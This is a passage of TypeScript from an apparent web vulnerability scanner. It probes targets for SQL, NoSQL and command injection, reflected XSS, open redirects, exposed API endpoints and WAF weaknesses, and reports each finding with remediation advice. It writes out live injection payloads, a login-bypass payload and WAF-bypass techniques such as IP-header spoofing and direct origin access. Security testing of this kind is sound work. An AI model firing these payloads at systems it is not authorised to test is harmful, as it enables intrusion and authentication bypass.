          remediation: "Use parameterised queries/prepared statements. Blind SQLi allows full data extraction without error messages. Apply an ORM and add WAF rules.",
        });
        sqliFound = true;
        await onLog(`[${ts()}] ⚠ BOOLEAN BLIND SQLI SIGNAL: '${param}' — true/false response ${Math.round(pctDiff * 100)}% different`);
      }
    }
  }

  // ── SQLi injection into JSON bodies, cookie values, and custom headers ────
  if (!sqliFound) {
    await onLog(`[${ts()}] Testing SQLi injection into JSON body, cookies, and custom headers...`);
    const sqliSignatures = SQLI_PATTERNS;
    const jsonSqliPayloads = ["' OR '1'='1", "'; SELECT SLEEP(0)--", "\" OR \"1\"=\"1"];
    // JSON body injection
    for (const sqlPayload of jsonSqliPayloads.slice(0, 2)) {
      const r = await probe(target.url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id: sqlPayload, username: sqlPayload, search: sqlPayload }),
        timeoutMs: 8_000,
      });
      if (r && sqliSignatures.some(p => p.test(r.body))) {
        findings.push({
          title: "SQL Injection via JSON Request Body — Error Leaked",
          severity: "high", verification: "suspected", confidence: 70, cvss: 7.5, cve: null,
          description: `A SQL injection payload in a JSON POST body produced a database error, confirming the server passes JSON values into SQL queries without sanitisation.`,
          evidence: `POST ${target.url}\nContent-Type: application/json\nPayload: ${JSON.stringify({ id: sqlPayload })}\nHTTP ${r.status}: SQL error pattern in response\nSnippet: ${r.body.slice(0, 300)}`,
          remediation: "Use parameterised queries for ALL input sources — not just URL parameters. JSON body values are equally dangerous.",
        });
        sqliFound = true;
        break;
      }
    }
    // Cookie injection
    if (!sqliFound) {
      for (const sqlPayload of jsonSqliPayloads.slice(0, 1)) {
        const r = await probe(target.url, {
          headers: { "Cookie": `session=${encodeURIComponent(sqlPayload)}; id=${encodeURIComponent(sqlPayload)}` },
          timeoutMs: 8_000,
        });
        if (r && sqliSignatures.some(p => p.test(r.body))) {
          findings.push({
            title: "SQL Injection via Cookie Value — Error Leaked",
            severity: "high", verification: "suspected", confidence: 70, cvss: 7.5, cve: null,
            description: "A SQL injection payload injected into a cookie value produced a database error.",
            evidence: `GET ${target.url}\nCookie: session=${sqlPayload}\nHTTP ${r.status}: SQL error in response\nSnippet: ${r.body.slice(0, 300)}`,
            remediation: "Never use raw cookie values in SQL queries. Use parameterised statements and treat all input sources (URL, headers, cookies, body) as untrusted.",
          });
          sqliFound = true;
        }
      }
    }
    // Custom header injection
    if (!sqliFound) {
      const sqlHeader = "' OR 1=1--";
      const r = await probe(target.url, {
        headers: { "X-Forwarded-For": sqlHeader, "X-User-Id": sqlHeader, "X-Custom-Header": sqlHeader },
        timeoutMs: 8_000,
      });
      if (r && sqliSignatures.some(p => p.test(r.body))) {
        findings.push({
          title: "SQL Injection via HTTP Request Header — Error Leaked",
          severity: "high", verification: "suspected", confidence: 65, cvss: 7.5, cve: null,
          description: "A SQL injection payload in a custom HTTP header produced a database error.",
          evidence: `GET ${target.url}\nX-Forwarded-For: ${sqlHeader}\nHTTP ${r.status}: SQL error in response\nSnippet: ${r.body.slice(0, 300)}`,
          remediation: "Treat HTTP headers as untrusted input. Do not use header values in SQL queries without parameterisation.",
        });
        sqliFound = true;
      }
    }
  }

  // ── XSS reflection detection ──────────────────────────────────────────────
  await onLog(`[${ts()}] Testing XSS reflection (reflected + DOM indicators)...`);
  const xssToken = Math.random().toString(36).slice(2, 10);
  const xssPayload = `<script>xss${xssToken}</script>`;
  const xssPolyglot = `jaVasCript:/*-/*\`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`;
  const xssParams = ["q", "search", "name", "msg", "message", "text", "content", "input", "title", "value", "data", "error", "callback", "return", "next", "redirect"];
  let xssFound = false;
  for (const param of xssParams.slice(0, 10)) {
    if (xssFound) break;
    for (const payload of [xssPayload, `"><img src=x onerror=alert(${xssToken})>`]) {
      const probeUrl = `${target.url.replace(/\/$/, "")}?${param}=${encodeURIComponent(payload)}`;
      const r = await probe(probeUrl, { timeoutMs: 8_000 });
      if (!r) continue;
      const contentType = (r.headers["content-type"] ?? "").toLowerCase();
      const reflected = isContextualReflection(r.body, payload) ||
        isContextualReflection(r.body, `xss${xssToken}`);
      const executableHtml = contentType.includes("text/html") &&
        (/<script\b[^>]*>xss[a-z0-9]+<\/script>/i.test(r.body) || new RegExp(`onerror=alert\\(${xssToken}\\)`, "i").test(r.body));
      if (!activeProbesAllowed()) break;
      if (reflected && executableHtml) {
        findings.push({
          title: "Reflected XSS — Script/Event Payload Returned Unescaped",
          severity: "high",
          verification: "suspected",
          confidence: 78,
          description: `Parameter '${param}' reflects user-supplied HTML/JS without encoding. An attacker can craft a URL with JavaScript that executes in victims' browsers — enabling session token theft, credential phishing, and account takeover.`,
          cvss: 7.4, cve: null,
          evidence: `PROBE: GET ${probeUrl}\nPAYLOAD: ${param}=${payload}\nContent-Type: ${contentType}\nHTTP ${r.status}: payload reflected without encoding\nVERIFICATION: suspected — browser execution was not performed (no headless browser available)`,
          remediation: "HTML-encode all user-controlled output at render time. Use a templating engine that escapes by default (Jinja2, Handlebars, React JSX). Implement a strict Content-Security-Policy. Validate Content-Type headers.",
        });
        xssFound = true;
        await onLog(`[${ts()}] ⚠ REFLECTED XSS SIGNAL via param '${param}'`);
        break;
      }
    }
  }

  // ── NoSQL Injection ───────────────────────────────────────────────────────
  await onLog(`[${ts()}] Testing NoSQL injection...`);
  const nosqlBaseline = await probe(target.url, { timeoutMs: 8_000 });
  const nosqlPayloads = [
    { body: '{"username":{"$gt":""},"password":{"$gt":""}}', ct: "application/json" },
    { body: '{"username":{"$regex":".*"},"password":{"$regex":".*"}}', ct: "application/json" },
    { body: "username[$gt]=&password[$gt]=", ct: "application/x-www-form-urlencoded" },
    { body: "username[$ne]=invalid&password[$ne]=invalid", ct: "application/x-www-form-urlencoded" },
  ];
  for (const ep of [`${target.url.replace(/\/$/, "")}/api/login`, `${target.url.replace(/\/$/, "")}/login`, `${target.url.replace(/\/$/, "")}/auth`].slice(0, 2)) {
    for (const { body, ct } of nosqlPayloads.slice(0, 2)) {
      const r = await probe(ep, { method: "POST", headers: { "Content-Type": ct }, body, timeoutMs: 8_000 });
      if (!r) continue;
      const blStatus = nosqlBaseline?.status ?? 0;
      const bodyLower = r.body.toLowerCase();
      const successSignals = ["welcome", "dashboard", "logged in", "token", "access_token", "session", '"user":', '"id":', '"role":'];
      const isSuccess = successSignals.some(s => bodyLower.includes(s));
      if (activeProbesAllowed() && r.status === 200 && isSuccess && (blStatus !== 200 || Math.abs(r.body.length - (nosqlBaseline?.body.length ?? 0)) > 100)) {
        findings.push({
          title: "NoSQL Injection — MongoDB Operator Authentication Bypass",
          severity: "critical",
          verification: "suspected",
          confidence: 75,
          description: `A MongoDB-style operator injection payload ($gt/$regex/$ne) produced a success response at ${ep}. This commonly indicates MongoDB NoSQL injection allowing authentication bypass without valid credentials.`,
          cvss: 9.8, cve: null,
          evidence: `POST ${ep}\nContent-Type: ${ct}\nBody: ${body}\nHTTP ${r.status} — success signals in response\nResponse: ${r.body.slice(0, 300)}`,
          remediation: "Sanitise all query inputs — strip $ prefixes and special MongoDB operators from user input. Use an ODM (Mongoose) with strict schema validation. Never pass raw user input into MongoDB query objects.",
        });
        await onLog(`[${ts()}] ⚠ NOSQL INJECTION SIGNAL at ${ep}`);
        break;
      }
    }
  }

  // ── Command injection basic probe ─────────────────────────────────────────
  await onLog(`[${ts()}] Testing command injection...`);
  const cmdCanary = `sentinelx-cmd-${Math.random().toString(36).slice(2, 10)}`;
  const cmdPayloads = [
    `; printf ${cmdCanary}`,
    `| printf ${cmdCanary}`,
    `\`printf ${cmdCanary}\``,
    `$(printf ${cmdCanary})`,
    `; echo ${cmdCanary}`,
  ];
  const cmdParams = ["cmd", "exec", "command", "run", "shell", "ping", "host", "ip", "target", "file", "path", "name", "url"];
  for (const param of cmdParams.slice(0, 6)) {
    let cmdFound = false;
    for (const payload of cmdPayloads.slice(0, 3)) {
      const probeUrl = `${target.url.replace(/\/$/, "")}?${param}=${encodeURIComponent(payload)}`;
      const r = await probe(probeUrl, { timeoutMs: 8_000 });
      if (!r) continue;
      if (r.body.includes(cmdCanary)) {
        findings.push({
          title: `OS Command Injection — Canary Executed via '${param}' Parameter`,
          severity: "critical",
          verification: "verified",
          confidence: 98,
          cvss: 10.0, cve: null,
          description: `The application executed a shell command injected via the '${param}' parameter. A bounded canary string (${cmdCanary}) was returned in the response, confirming operating-system command execution. This allows full server compromise.`,
          evidence: `PROBE: GET ${probeUrl}\nPAYLOAD: ${param}=${payload}\nCANARY: ${cmdCanary}\nHTTP ${r.status} — canary found in response\nResponse snippet: ${r.body.slice(0, 400)}`,
          remediation: "Never pass user input to shell execution functions (exec, system, popen, subprocess). Use language-native libraries instead of shell calls. If shell is required, use an allowlist of permitted commands and shell-escape all arguments.",
        });
        await onLog(`[${ts()}] ⚠ COMMAND INJECTION CONFIRMED via param '${param}'`);
        cmdFound = true;
        break;
      }
    }
    if (cmdFound) break;
  }

  // ── Open redirect ─────────────────────────────────────────────────────────
  await onLog(`[${ts()}] Testing open redirect...`);
  const redirectMarker = "redirect-test-sentinel-x";
  const redirectPayloads = [
    target.url + `?redirect=https://${redirectMarker}.example.com`,
    target.url + `?next=https://${redirectMarker}.example.com`,
    target.url + `?url=https://${redirectMarker}.example.com`,
    target.url + `?return=https://${redirectMarker}.example.com`,
    target.url + `?returnUrl=https://${redirectMarker}.example.com`,
    target.url + `?goto=https://${redirectMarker}.example.com`,
  ];
  for (const probeUrl of redirectPayloads) {
    const r = await probe(probeUrl, { followRedirects: false, timeoutMs: 8_000 });
    if (!r) continue;
    if ([301, 302, 303, 307, 308].includes(r.status)) {
      const loc = r.headers["location"] ?? "";
      if (loc.includes(redirectMarker)) {
        findings.push({
          title: "Open Redirect Vulnerability",
          severity: "medium",
          description: "The application redirects users to attacker-controlled URLs without validation. Attackers can craft phishing links that appear to come from a trusted domain, bypassing browser warnings and corporate email filters.",
          cvss: 6.1, cve: null,
          evidence: `Probe URL: ${probeUrl}\nHTTP ${r.status} Location: ${loc}`,
          remediation: "Validate redirect destinations against an allowlist of trusted URLs or paths. Never redirect to arbitrary user-supplied URLs. Use relative paths for internal redirects.",
        });
        break;
      }
    }
  }

  // ── HTTP methods enumeration ──────────────────────────────────────────────
  await onLog(`[${ts()}] Enumerating HTTP methods...`);
  const optR = await probe(target.url, { method: "OPTIONS", timeoutMs: 6_000 });
  if (optR) {
    const allow = optR.headers["allow"] ?? optR.headers["public"] ?? "";
    const dangerous = ["PUT", "DELETE", "TRACE", "CONNECT"].filter((m) => allow.toUpperCase().includes(m));
    if (dangerous.length > 0) {
      findings.push({
        title: `Dangerous HTTP Methods Advertised: ${dangerous.join(", ")}`,
        severity: "medium",
        description: `OPTIONS response advertises: ${dangerous.join(", ")}. PUT/DELETE allow file manipulation if unrestricted. TRACE enables Cross-Site Tracing.`,
        cvss: 5.3, cve: null,
        evidence: `OPTIONS ${target.url} → HTTP ${optR.status}\nAllow: ${allow}`,
        remediation: "Restrict allowed methods to GET, POST, HEAD only. Disable TRACE. Require authentication for PUT/DELETE.",
      });
    }
  }

  // ── Error page information disclosure ────────────────────────────────────
  await onLog(`[${ts()}] Checking error page disclosure...`);
  const errorR = await probe(target.url + "__nonexistent__sentinelx", { timeoutMs: 6_000 });
  if (errorR) {
    const body = errorR.body.toLowerCase();
    const stack = body.match(/traceback|stack trace|exception in|at \w+\.\w+\(|file ".*\.py"/i);
    if (stack) {
      findings.push({
        title: "Stack Trace Disclosed in Error Response",
        severity: "high",
        description: "The application returns detailed stack traces on errors, revealing internal file paths, framework versions, and code structure. This significantly aids an attacker's ability to find and exploit vulnerabilities.",
        cvss: 7.5, cve: null,
        evidence: `GET ${target.url}__nonexistent__sentinelx → HTTP ${errorR.status}\nStack trace detected: ${errorR.body.slice(0, 400)}`,
        remediation: "Disable debug mode in production. Configure generic 404/500 error pages that reveal no technical details. Log errors server-side instead of displaying them.",
      });
    }
  }

  // ── Directory listing ─────────────────────────────────────────────────────
  const dirPaths = ["/images/", "/uploads/", "/static/", "/assets/", "/files/", "/backup/", "/css/", "/js/"];
  for (const dirPath of dirPaths) {
    const dirUrl = target.url.replace(/\/$/, "") + dirPath;
    const r = await probe(dirUrl, { timeoutMs: 6_000 });
    if (!r) continue;
    if (r.status === 200 && (r.body.includes("Index of ") || r.body.includes("Directory listing"))) {
      findings.push({
        title: `Directory Listing Enabled (${dirPath})`,
        severity: "medium",
        description: `Directory listing is enabled for ${dirPath}. Attackers can enumerate all files, including uploads, backups, and documents not intended to be public.`,
        cvss: 5.3, cve: null,
        evidence: `GET ${dirUrl} → HTTP ${r.status}\nBody contains directory listing\nPreview: ${r.body.slice(0, 300)}`,
        remediation: `Disable directory listing in web server config. Apache: Options -Indexes. Nginx: autoindex off;`,
      });
      break;
    }
  }

  await onLog(`[${ts()}] Web app probes complete — ${findings.length} finding(s)`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// 12. API SURFACE DISCOVERY
// ═══════════════════════════════════════════════════════════════════════════════

async function checkApiSurface(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Probing API documentation and management endpoints...`);

  // WADL (Web Application Description Language)
  for (const ep of ["/application.wadl", "/api/application.wadl", "/rest/application.wadl"]) {
    const url = target.url.replace(/\/$/, "") + ep;
    const r = await probe(url, { timeoutMs: 6_000 });
    if (r?.status === 200 && (r.body.includes("<application") && r.body.includes("xmlns"))) {
      findings.push({
        title: "WADL API Description Exposed",
        severity: "medium", cvss: 5.3, cve: null,
        description: "WADL (Web Application Description Language) file is publicly accessible. It enumerates all REST resources, methods, parameters, and representations — providing a complete API blueprint to attackers.",
        evidence: `GET ${url} → HTTP ${r.status}\nBody contains WADL XML\nPreview: ${r.body.slice(0, 200)}`,
        remediation: "Restrict WADL to authenticated users or internal networks. Disable in production if not required.",
      });
      break;
    }
  }

  // GraphQL introspection
  for (const ep of ["/graphql", "/api/graphql", "/gql", "/query", "/v1/graphql"]) {
    const url = target.url.replace(/\/$/, "") + ep;
    const r = await probe(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ query: "{ __schema { types { name } } }" }),
      timeoutMs: 8_000,
    });
    if (r?.status === 200 && r.body.includes("__schema")) {
      findings.push({
        title: "GraphQL Introspection Enabled in Production",
        severity: "high",
        description: "GraphQL introspection is enabled, exposing the complete schema — all types, fields, mutations, and queries. Attackers get a full API map without reverse-engineering.",
        cvss: 7.5, cve: null,
        evidence: `POST ${url} with introspection query → HTTP ${r.status}\nResponse contains __schema\nPartial: ${r.body.slice(0, 300)}`,
        remediation: "Disable introspection in production. Apollo: introspection: false. Most frameworks have a single config flag.",
      });
      break;
    }
  }

  // Swagger / OpenAPI exposure
  for (const ep of ["/swagger", "/swagger-ui.html", "/api-docs", "/openapi.json", "/openapi.yaml", "/docs", "/redoc", "/v2/api-docs", "/v3/api-docs"]) {
    const url = target.url.replace(/\/$/, "") + ep;
    const r = await probe(url, { timeoutMs: 6_000 });
    if (!r || r.status !== 200) continue;
    const body = r.body.toLowerCase();
    if (body.includes("swagger") || body.includes("openapi") || body.includes('"paths"')) {
      findings.push({
        title: "API Documentation (Swagger/OpenAPI) Publicly Exposed",
        severity: "medium",
        description: "API documentation is publicly accessible, providing a complete map of all endpoints, parameters, and auth requirements — eliminating reconnaissance for attackers.",
        cvss: 5.3, cve: null,
        evidence: `GET ${url} → HTTP ${r.status}\nContent indicates Swagger/OpenAPI`,
        remediation: "Restrict API docs to authenticated users or internal networks. Consider disabling in production.",
      });
      break;
    }
  }

  // Spring Boot Actuator
  for (const ep of ["/actuator/env", "/actuator/heapdump", "/actuator/beans", "/actuator"]) {
    const url = target.url.replace(/\/$/, "") + ep;
    const r = await probe(url, { timeoutMs: 6_000 });
    if (!r || r.status !== 200) continue;
    const body = r.body.toLowerCase();
    const isActuatorPayload =
      body.includes('"activeprofiles"') ||
      body.includes('"propertysources"') ||
      body.includes('"contexts"') ||
      body.includes('"beans"') ||
      body.includes('"heapdump"');
    if (isActuatorPayload) {
      findings.push({
        title: `Spring Boot Actuator Endpoint Exposed (${ep})`,
        severity: ep.includes("env") || ep.includes("heap") ? "high" : "medium",
        description: `Spring Boot Actuator ${ep} is publicly accessible. ${ep.includes("env") ? "The /env endpoint may expose environment and configuration values. " : ep.includes("heap") ? "The /heapdump endpoint may expose in-memory application data. " : ""}This confirms an exposed management endpoint, not remote code execution.`,
        cvss: ep.includes("env") || ep.includes("heap") ? 9.8 : 7.5, cve: null,
        evidence: `GET ${url} → HTTP ${r.status}\n${r.body.slice(0, 300)}`,
        remediation: "Restrict Actuator to management ports: management.server.port=8081. Require authentication. Disable sensitive endpoints.",
      });
      break;
    }
  }

  // GraphQL query depth limit
  for (const ep of ["/graphql", "/api/graphql", "/gql"]) {
    const url = target.url.replace(/\/$/, "") + ep;
    const deepQuery = `{ a { b { c { d { e { f { g { h { i { j { k { l { m { n { o { __typename } } } } } } } } } } } } } } } }`;
    const r = await probe(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ query: deepQuery }),
      timeoutMs: 10_000,
    });
    if (r?.status === 200 && !r.body.toLowerCase().includes("query is too deep") && !r.body.includes("depth limit") && !r.body.includes("maxDepth")) {
      findings.push({
        title: "GraphQL Query Depth Limit Not Enforced",
        severity: "medium", cvss: 5.9, cve: null,
        description: "A deeply nested GraphQL query (15 levels) was accepted without error. Without query depth limits, attackers can craft exponentially expensive queries causing CPU/memory exhaustion (GraphQL DoS).",
        evidence: `POST ${url}\nQuery depth: 15 levels\nHTTP ${r.status} — no depth limit error in response\nResponse: ${r.body.slice(0, 200)}`,
        remediation: "Implement query depth limits (max 10 levels). Use graphql-depth-limit or equivalent library. Add query complexity analysis.",
      });
      break;
    }
  }

  // Laravel Telescope
  for (const ep of ["/telescope", "/telescope/api/requests"]) {
    const url = target.url.replace(/\/$/, "") + ep;
    const r = await probe(url, { timeoutMs: 6_000 });
    if (r?.status === 200 && (r.body.includes("Laravel Telescope") || r.body.includes('"payload"'))) {
      findings.push({
        title: "Laravel Telescope Debug Dashboard Exposed",
        severity: "high",
        description: "Laravel Telescope is publicly accessible. It exposes all HTTP requests, database queries, exceptions, mail, jobs, and potentially sensitive request payloads.",
        cvss: 8.1, cve: null,
        evidence: `GET ${url} → HTTP ${r.status}`,
        remediation: "Restrict Telescope to local or authenticated environments only. Add authorizeUsing() gate. Disable in production.",
      });
      break;
    }
  }

  await onLog(`[${ts()}] API surface scan complete — ${findings.length} finding(s)`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// WAF DETECTION & BYPASS TECHNIQUES
// ═══════════════════════════════════════════════════════════════════════════════

const WAF_SIGNATURES: Record<string, { headers: string[]; body: string[]; cookies: string[] }> = {
  "Cloudflare":      { headers: ["cf-ray", "cf-cache-status", "cf-worker", "cf-request-id"], body: ["cloudflare", "attention required! | cloudflare"], cookies: ["__cfduid", "cf_clearance"] },
  "AWS WAF":         { headers: ["x-amzn-requestid", "x-amz-cf-id", "x-amz-apigw-id"], body: [], cookies: [] },
  "Akamai":          { headers: ["akamai-origin-hop", "x-akamai-transformed", "x-check-cacheable", "x-serial"], body: ["reference #18."], cookies: ["ak_bmsc"] },
  "Sucuri":          { headers: ["x-sucuri-id", "x-sucuri-cache"], body: ["sucuri website firewall"], cookies: [] },
  "Imperva/Incapsula": { headers: ["x-iinfo", "x-cdn"], body: ["incapsula incident id"], cookies: ["incap_ses", "visid_incap"] },
  "F5 BIG-IP ASM":  { headers: ["x-cnection", "x-wa-info"], body: ["the requested url was rejected"], cookies: ["TS", "bigipserver"] },
  "Barracuda":       { headers: [], body: ["barracuda networks"], cookies: ["barra_counter_session"] },
  "ModSecurity":     { headers: ["x-mod-security-message"], body: ["mod_security", "not acceptable"], cookies: [] },
  "Fastly":          { headers: ["x-fastly-request-id", "fastly-debug-digest"], body: [], cookies: [] },
  "Varnish":         { headers: ["x-varnish"], body: [], cookies: [] },
  "Nginx WAF":       { headers: [], body: ["406 not acceptable"], cookies: [] },
  "Wordfence":       { headers: [], body: ["generated by wordfence", "your access to this site has been limited"], cookies: [] },
};

async function checkWafAndBypass(target: Target, onLog: LogFn): Promise<{ findings: RealFinding[]; wafName: string | null }> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Detecting WAF/CDN and testing bypass techniques...`);

  const r = await probe(target.url, { timeoutMs: 12_000 });
  if (!r) return { findings, wafName: null };
  if (r.wafChallenge || isWafChallengeDetected()) {
    await onLog(`[${ts()}] WAF challenge response received during initial detection; bypass probes skipped.`);
    return { findings, wafName: "Cloudflare" };
  }

  // ── Detect WAF ─────────────────────────────────────────────────────────────
  let detectedWaf: string | null = null;
  const allHeaders = JSON.stringify(r.headers).toLowerCase();
  const allCookies = (r.headers["set-cookie"] ?? "").toLowerCase();
  const bodyLower = r.body.toLowerCase();

  for (const [waf, sigs] of Object.entries(WAF_SIGNATURES)) {
    const headerMatch = sigs.headers.some(h => allHeaders.includes(h.toLowerCase()));
    const bodyMatch = sigs.body.some(b => bodyLower.includes(b.toLowerCase()));
    const cookieMatch = sigs.cookies.some(c => allCookies.includes(c.toLowerCase()));
    if (headerMatch || bodyMatch || cookieMatch) { detectedWaf = waf; break; }
  }

  if (detectedWaf) {
    await onLog(`[${ts()}] WAF/CDN detected: ${detectedWaf}`);
    findings.push({
      title: `WAF/CDN Detected: ${detectedWaf}`,
      severity: "low", verification: "informational", confidence: 92,
      cvss: 0, cve: null,
      description: `A Web Application Firewall (${detectedWaf}) is in front of this target. Bypass techniques are now being tested — results reported separately.`,
      evidence: `WAF: ${detectedWaf}\nRelevant response headers:\n${allHeaders.slice(0, 400)}`,
      remediation: "WAFs are a defence-in-depth measure, not a primary fix. Keep the underlying application patched and secure independently of the WAF.",
    });

    // ── Try IP-spoofing bypass headers ───────────────────────────────────────
    await onLog(`[${ts()}] Testing WAF bypass via IP-spoofing headers...`);
    const bypassHeaderSets: Record<string, string>[] = [
      { "X-Forwarded-For": "127.0.0.1" },
      { "X-Real-IP": "127.0.0.1" },
      { "X-Originating-IP": "127.0.0.1" },
      { "X-Remote-IP": "127.0.0.1" },
      { "X-Client-IP": "127.0.0.1" },
      { "True-Client-IP": "127.0.0.1" },
      { "CF-Connecting-IP": "127.0.0.1" },
      { "X-ProxyUser-Ip": "127.0.0.1" },
      { "X-Forwarded-Host": target.hostname },
    ];
    for (const hdrs of bypassHeaderSets) {
      const bypassR = await probe(target.url, { headers: hdrs, timeoutMs: 10_000 });
      if (bypassR && Math.abs(bypassR.body.length - r.body.length) > 300) {
        const hdrKey = Object.keys(hdrs)[0]!;
        findings.push({
          title: `WAF Bypass Signal: IP Header Spoofing (${hdrKey})`,
          severity: "high", verification: "suspected", confidence: 72,
          cvss: 7.5, cve: null,
          description: `Adding ${hdrKey}: ${Object.values(hdrs)[0]} produced a significantly different response (${r.body.length} → ${bypassR.body.length} bytes). The WAF may trust this header and grant different access for "internal" traffic, effectively bypassing its rules.`,
          evidence: `Baseline: GET ${target.url} → HTTP ${r.status} (${r.body.length} bytes)\nWith ${hdrKey}: ${Object.values(hdrs)[0]} → HTTP ${bypassR.status} (${bypassR.body.length} bytes)\nDifference: ${Math.abs(bypassR.body.length - r.body.length)} bytes`,
          remediation: "Only trust IP override headers (X-Forwarded-For, X-Real-IP, etc.) from verified internal proxy IP ranges. Block all such headers from external sources at the network layer.",
        });
        await onLog(`[${ts()}] ⚠ WAF BYPASS SIGNAL: ${hdrKey} produced different response`);
        break;
      }
    }

    // ── Googlebot UA bypass ──────────────────────────────────────────────────
    const botR = await probe(target.url, { headers: { "User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)" }, timeoutMs: 10_000 });
    if (botR && Math.abs(botR.body.length - r.body.length) > 500) {
      findings.push({
        title: "WAF Bypass Signal: Googlebot User-Agent Treated Differently",
        severity: "medium", verification: "suspected", confidence: 60,
        cvss: 5.3, cve: null,
        description: "The server returns a significantly different response for Googlebot User-Agent requests. WAF may whitelist search crawlers, creating a bypass path for attackers impersonating them.",
        evidence: `Normal UA → ${r.body.length} bytes HTTP ${r.status}\nGooglebot UA → ${botR.body.length} bytes HTTP ${botR.status}\nDifference: ${Math.abs(botR.body.length - r.body.length)} bytes`,
        remediation: "Do not apply different security rules based on User-Agent. Verify legitimate Googlebot via reverse DNS, not just the UA string.",
      });
      await onLog(`[${ts()}] ⚠ WAF BYPASS SIGNAL: Googlebot UA returned different response`);
    }

    // ── Direct origin IP access (bypass WAF entirely) ────────────────────────
    await onLog(`[${ts()}] Checking for direct origin IP exposure (full WAF bypass)...`);
    try {
      const ips = await digQuery(target.hostname, "A");
      for (const ip of ips.slice(0, 2)) {
        const originR = await probe(`http://${ip}/`, { headers: { "Host": target.hostname }, timeoutMs: 8_000, followRedirects: false });
        if (originR && originR.status >= 200 && originR.status < 400) {
          const originHeaders = JSON.stringify(originR.headers).toLowerCase();
          const hasWafHeader = WAF_SIGNATURES[detectedWaf]?.headers.some(h => originHeaders.includes(h)) ?? false;
          if (!hasWafHeader) {
            findings.push({
              title: `Origin IP Bypasses ${detectedWaf} WAF — Direct Access Confirmed (${ip})`,
              severity: "critical", verification: "verified", confidence: 92,
              cvss: 9.8, cve: null,
              description: `The origin server at ${ip} responds directly over HTTP without passing through ${detectedWaf}. All WAF protections are rendered ineffective — attackers can target the origin directly to exploit any vulnerability the WAF would otherwise block.`,
              evidence: `WAF-protected host: ${target.hostname}\nDirect IP: ${ip}\nHTTP GET http://${ip}/ with Host: ${target.hostname}\n→ HTTP ${originR.status} response without WAF headers\nWAF headers absent in response`,
              remediation: `1. Firewall the origin to accept connections ONLY from ${detectedWaf}'s published IP ranges.\n2. Rotate the origin IP and restrict via cloud firewall rules.\n3. Use authenticated origin pulls (Cloudflare: authenticated origin pulls feature).\n4. Enforce mTLS between WAF and origin.`,
            });
            await onLog(`[${ts()}] ⚠ ORIGIN IP EXPOSED: ${ip} reachable without ${detectedWaf} — full WAF bypass confirmed`);
          }
        }
      }
    } catch { /* expected */ }

    // ── Case-variation / encoding bypass test ────────────────────────────────
    const pathR = await probe(`${target.url.replace(/\/$/, "")}/..%2f`, { timeoutMs: 6_000 });
    const dotR = await probe(`${target.url.replace(/\/$/, "")}/.%2e/`, { timeoutMs: 6_000 });
    if ((pathR && pathR.status === 200) || (dotR && dotR.status === 200)) {
      findings.push({
        title: "WAF Path Normalisation Bypass (URL-Encoded Traversal)",
        severity: "medium", verification: "suspected", confidence: 60,
        cvss: 5.3, cve: null,
        description: "URL-encoded path segments (%2f, %2e) returned a 200 response, suggesting the WAF does not normalise paths before matching rules. Attackers can use encoding tricks to bypass path-based WAF rules.",
        evidence: `GET ${target.url}..%2f → HTTP ${pathR?.status ?? "N/A"}\nGET ${target.url}.%2e/ → HTTP ${dotR?.status ?? "N/A"}`,
        remediation: "Configure the WAF to decode and normalise all URL encoding before applying rules. Enable path normalisation in your WAF settings.",
      });
    }
  } else {
    await onLog(`[${ts()}] No WAF/CDN signature detected — unprotected origin`);
  }

  return { findings, wafName: detectedWaf };
}

// ═══════════════════════════════════════════════════════════════════════════════
// SUBDOMAIN TAKEOVER
// ═══════════════════════════════════════════════════════════════════════════════

const TAKEOVER_FINGERPRINTS: Array<{ service: string; cnamePattern: RegExp; indicator: string }> = [
  { service: "GitHub Pages",   cnamePattern: /github\.io$/i,          indicator: "there isn't a github pages site here" },
  { service: "Heroku",         cnamePattern: /herokudns\.com$/i,       indicator: "no such app" },
  { service: "Shopify",        cnamePattern: /myshopify\.com$/i,       indicator: "sorry, this shop is currently unavailable" },
  { service: "Fastly",         cnamePattern: /fastly\.net$/i,          indicator: "fastly error: unknown domain:" },
  { service: "Pantheon",       cnamePattern: /pantheonsite\.io$/i,     indicator: "404 error unknown site!" },
  { service: "Tumblr",         cnamePattern: /tumblr\.com$/i,          indicator: "there's nothing here." },
  { service: "AWS S3",         cnamePattern: /s3\.amazonaws\.com$/i,   indicator: "nosuchbucket" },
  { service: "AWS CloudFront", cnamePattern: /cloudfront\.net$/i,      indicator: "the request could not be satisfied" },
  { service: "Azure Web Apps", cnamePattern: /azurewebsites\.net$/i,   indicator: "404 web site not found" },
  { service: "Zendesk",        cnamePattern: /zendesk\.com$/i,         indicator: "help center closed" },
  { service: "Surge.sh",       cnamePattern: /surge\.sh$/i,            indicator: "project not found" },
  { service: "Netlify",        cnamePattern: /netlify\.app$/i,         indicator: "not found - request id" },
  { service: "HubSpot",        cnamePattern: /hubspot\.net$/i,         indicator: "domain not found" },
  { service: "Ghost.io",       cnamePattern: /ghost\.io$/i,            indicator: "used ghost.io" },
  { service: "UserVoice",      cnamePattern: /uservoice\.com$/i,       indicator: "this uservoice subdomain is currently available" },
  { service: "Unbounce",       cnamePattern: /unbouncepages\.com$/i,   indicator: "the requested url was not found" },
  { service: "WordPress.com",  cnamePattern: /wordpress\.com$/i,       indicator: "do you want to register" },
];

async function checkSubdomainTakeover(subdomains: string[], onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  if (subdomains.length === 0) return findings;
  const toCheck = subdomains.slice(0, 40);
  await onLog(`[${ts()}] Checking ${toCheck.length} subdomains for takeover vulnerability...`);

  await Promise.allSettled(
    toCheck.map(async (sub) => {
      try {
        const { stdout } = await execFileAsync("dig", ["+short", "+timeout=3", sub, "CNAME"], { timeout: 8_000 });
        const cname = stdout.trim().replace(/\.$/, "");
        if (!cname || cname.length < 4) return;
